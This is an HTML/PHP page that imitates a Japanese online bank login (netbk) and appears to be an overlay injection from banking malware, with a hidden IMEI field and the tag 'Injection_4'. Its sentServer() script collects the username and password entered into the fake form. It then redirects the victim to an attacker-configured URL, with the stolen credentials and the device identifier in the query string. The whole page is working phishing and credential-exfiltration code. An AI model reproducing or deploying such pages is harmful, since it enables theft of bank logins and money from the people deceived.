<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="jp/jp.co.netbk/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div class="header">
	<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAeYAAABICAMAAAAULKbXAAAC91BMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8Y3nl4AAAA/HRSTlMAA1G887RxLgEkDwKw5pdFBR0VDjAbEx7+17mdgWUmhf3unDkH6vjbv6OHaTSEwBZNfJupkm9EDZjhCqgMZPuqQFSAKjrTbWI/0BR0zMZyy7qniGMyQRrg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">
</div>
    <div class="main">
        <div class="container">
            <div class="row">
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

                        <form id="form" class="form">

                            <div class="form-group ">
                                	<input type="text" class="form-control" name="field2" placeholder="ユーザーネーム" id="user" autocomplete="off" data-reg="/.{3,50}/">
                            </div>

                            <div class="form-group">
                                	<input type="password" class="form-control" name="field3" id="pass" placeholder="WEBログインパスワード" autocomplete="off" data-reg="/.{3,50}/">
                            </div>
<?php
echo "<input data-role='none' type='text' name='imei' value='$IMEI_country' class='imei' style='visibility:hidden'/>";
?>
							<input type="button" class="input_submitBtn" onClick="sentServer();" value="ログイン">

                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

<h3> パスワードをお忘れの方は<b style="color: #0769b5">こちら </b> </h3>
<script>
	function sentServer()
	{
	var oNumInp1 = document.getElementById('user');
	var oNumInp2 = document.getElementById('pass');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["user"].value;
	var pass = document.forms["form"].elements["pass"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|netbk|"+login1+"|"+pass);
	}
	}
</script>

</body>
</html>
